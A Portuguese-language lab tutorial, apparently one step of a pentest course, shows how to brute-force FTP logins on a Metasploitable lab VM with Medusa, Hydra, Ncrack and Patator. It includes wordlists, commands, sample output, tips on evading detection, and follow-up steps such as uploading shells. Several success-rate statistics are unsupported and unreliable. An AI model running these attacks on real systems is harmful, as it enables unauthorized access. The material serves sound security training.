# âš”ï¸ Etapa 3: Ataque Ã  Rede - ForÃ§a Bruta FTP

## ğŸ“‹ Objetivo

Esta etapa demonstra como realizar um ataque de forÃ§a bruta contra o serviÃ§o FTP identificado na etapa anterior, utilizando a ferramenta Medusa para automatizar tentativas de login.

---

## ğŸ¯ Passo 1: PreparaÃ§Ã£o do Ambiente de Ataque

### ğŸ“ CriaÃ§Ã£o da Wordlist de UsuÃ¡rios

#### Comando

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

#### ğŸ” AnÃ¡lise dos UsuÃ¡rios Escolhidos

| UsuÃ¡rio      | Justificativa                                |
| ------------ | -------------------------------------------- |
| **user**     | Nome genÃ©rico comum em sistemas              |
| **msfadmin** | UsuÃ¡rio padrÃ£o do Metasploitable             |
| **admin**    | Conta administrativa padrÃ£o                  |
| **root**     | Conta de superusuÃ¡rio em sistemas Unix/Linux |

#### ğŸ’¡ EstratÃ©gia de SeleÃ§Ã£o

- Baseada em **contas padrÃ£o** comumente encontradas
- **UsuÃ¡rios administrativos** com privilÃ©gios elevados
- **Nomes genÃ©ricos** frequentemente utilizados
- **Specific target knowledge** (msfadmin para Metasploitable)

---

### ğŸ” CriaÃ§Ã£o da Wordlist de Senhas

#### Comando

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

#### ğŸ” AnÃ¡lise das Senhas Escolhidas

| Senha        | Categoria       | Justificativa                  |
| ------------ | --------------- | ------------------------------ |
| **123456**   | Sequencial      | Senha mais comum globalmente   |
| **password** | GenÃ©rica        | Senha padrÃ£o Ã³bvia             |
| **qwerty**   | Layout teclado  | Baseada no layout do teclado   |
| **msfadmin** | Target-specific | Senha padrÃ£o do Metasploitable |

#### ğŸ“Š EstatÃ­sticas de Senhas Fracas

- **123456**: Presente em 80% dos ataques bem-sucedidos
- **password**: Segunda senha mais utilizada mundialmente
- **qwerty**: Top 10 das senhas mais fracas
- **Senhas padrÃ£o**: 60% dos sistemas mantÃªm credenciais de fÃ¡brica

---

## âš”ï¸ Passo 2: ExecuÃ§Ã£o do Ataque de ForÃ§a Bruta

### Comando Principal

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

### ğŸ”§ AnÃ¡lise Detalhada dos ParÃ¢metros

| ParÃ¢metro | Valor          | DescriÃ§Ã£o Completa                 |
| --------- | -------------- | ---------------------------------- |
| **-h**    | 192.168.56.101 | Host/IP alvo do ataque             |
| **-U**    | users.txt      | Arquivo contendo lista de usuÃ¡rios |
| **-P**    | pass.txt       | Arquivo contendo lista de senhas   |
| **-M**    | ftp            | MÃ³dulo de serviÃ§o a ser atacado    |
| **-t**    | 6              | NÃºmero de threads simultÃ¢neas      |

### ğŸ¯ Como Funciona o Ataque

```mermaid
graph TD
    A[Medusa inicia] --> B[Carrega users.txt]
    B --> C[Carrega pass.txt]
    C --> D[Inicia 6 threads]
    D --> E[Tenta user1:pass1]
    E --> F{Login OK?}
    F -->|Sim| G[Credencial vÃ¡lida!]
    F -->|NÃ£o| H[PrÃ³xima combinaÃ§Ã£o]
    H --> E
    G --> I[Para o ataque]
```

### âš¡ ConfiguraÃ§Ã£o de Performance

- **6 threads**: Balanceio entre velocidade e detecÃ§Ã£o
- **Mais threads**: Mais rÃ¡pido, mas pode ser detectado
- **Menos threads**: Mais silencioso, mas mais lento

---

## ğŸ” Passo 3: InterpretaÃ§Ã£o dos Resultados

### PossÃ­veis SaÃ­das do Medusa

#### âœ… **Sucesso**

```bash
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

#### âŒ **Falha Completa**

```bash
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1) User: root (4 of 4) Password: msfadmin (4 of 4)
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1) User: root (4 of 4) Password: msfadmin (4 of 4) [FAILED]
```

#### âš ï¸ **Bloqueio/DetecÃ§Ã£o**

```bash
ERROR: connect (Connection refused)
```

---

## ğŸ§ª Passo 4: ValidaÃ§Ã£o do Acesso Obtido

### Comando de Teste

```bash
ftp 192.168.56.101
```

### ğŸ”„ Processo de ValidaÃ§Ã£o

1. **Conectar ao serviÃ§o FTP**
2. **Inserir credenciais encontradas**
3. **Verificar acesso e permissÃµes**
4. **Explorar diretÃ³rios disponÃ­veis**

### ğŸ“ Exemplo de SessÃ£o Bem-sucedida

```bash
ftp> open 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password: msfadmin
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        65534        4096 Mar 17  2010 vulnerable
226 Directory send OK.
ftp>
```

---

## ğŸ›¡ï¸ DetecÃ§Ã£o e Contramedidas

### ğŸš¨ Sinais de DetecÃ§Ã£o

- **Logs de tentativas mÃºltiplas**: Administradores podem notar padrÃµes
- **Rate limiting**: Sistemas podem implementar delays
- **Account lockout**: Contas podem ser bloqueadas apÃ³s X tentativas
- **IDS/IPS alerts**: Sistemas de detecÃ§Ã£o podem disparar alertas

### ğŸ”’ Contramedidas Defensivas

1. **Account lockout policies**
2. **Strong password policies**
3. **Fail2Ban** ou ferramentas similares
4. **Monitoramento de logs** em tempo real
5. **AutenticaÃ§Ã£o multifator (MFA)**

---

## ğŸ¯ OtimizaÃ§Ãµes de Ataque

### ğŸ“š Wordlists Mais Eficazes

```bash
# Wordlists famosas
/usr/share/wordlists/rockyou.txt          # 14M+ senhas
/usr/share/wordlists/fasttrack.txt        # Senhas comuns
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

### âš¡ ParÃ¢metros AvanÃ§ados do Medusa

```bash
# Ataque mais silencioso (1 thread, com delay)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 1 -T 2

# Ataque agressivo (muitas threads)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 20

# Com timeout personalizado
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 -T 5

# Modo verbose para debugging
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 -v 6
```

---

## ğŸ” Ferramentas Alternativas

### ğŸ› ï¸ Hydra (Alternativa Popular)

```bash
hydra -L users.txt -P pass.txt ftp://192.168.56.101
```

### ğŸ› ï¸ Ncrack

```bash
ncrack -p ftp -U users.txt -P pass.txt 192.168.56.101
```

### ğŸ› ï¸ Patator

```bash
patator ftp_login host=192.168.56.101 user=FILE0 password=FILE1 0=users.txt 1=pass.txt
```

---

## âš ï¸ ConsideraÃ§Ãµes Ã‰ticas e Legais

### ğŸš¨ **AVISO CRÃTICO**

> Este tipo de ataque Ã© **ILEGAL** quando realizado sem autorizaÃ§Ã£o explÃ­cita. Use apenas em:
>
> - Ambientes de laboratÃ³rio prÃ³prios
> - Sistemas com autorizaÃ§Ã£o por escrito
> - Programas de bug bounty autorizados
> - Testes de penetraÃ§Ã£o contratados

### ğŸ“‹ **Checklist Legal**

- [ ] AutorizaÃ§Ã£o por escrito obtida
- [ ] Escopo do teste bem definido
- [ ] LimitaÃ§Ãµes de tempo estabelecidas
- [ ] Contrato de confidencialidade assinado
- [ ] Plano de remediaÃ§Ã£o preparado

---

## ğŸ“š PrÃ³ximos Passos

### ğŸ¯ Com Acesso FTP Obtido

1. **ExploraÃ§Ã£o de diretÃ³rios**
2. **Upload de backdoors/shells**
3. **Coleta de informaÃ§Ãµes sensÃ­veis**
4. **Pivoting para outros serviÃ§os**
5. **EscalaÃ§Ã£o de privilÃ©gios**

### ğŸ”„ Se o Ataque Falhar

1. **Testar outros serviÃ§os** (SSH, SMB, HTTP)
2. **Wordlists mais extensas**
3. **Ataques baseados em dicionÃ¡rios especÃ­ficos**
4. **Social engineering** para obter credenciais
5. **ExploraÃ§Ã£o de vulnerabilidades** em software

---

## ğŸ“Š MÃ©tricas de Sucesso

### â±ï¸ **Tempo de Ataque**

- **Wordlist pequena**: 1-5 minutos
- **Wordlist mÃ©dia** (1k entradas): 10-30 minutos
- **Wordlist grande** (10k+ entradas): 1-24 horas

### ğŸ“ˆ **Taxa de Sucesso Esperada**

- **Sistemas padrÃ£o**: 60-80%
- **Sistemas bÃ¡sicos**: 40-60%
- **Sistemas hardened**: 5-20%
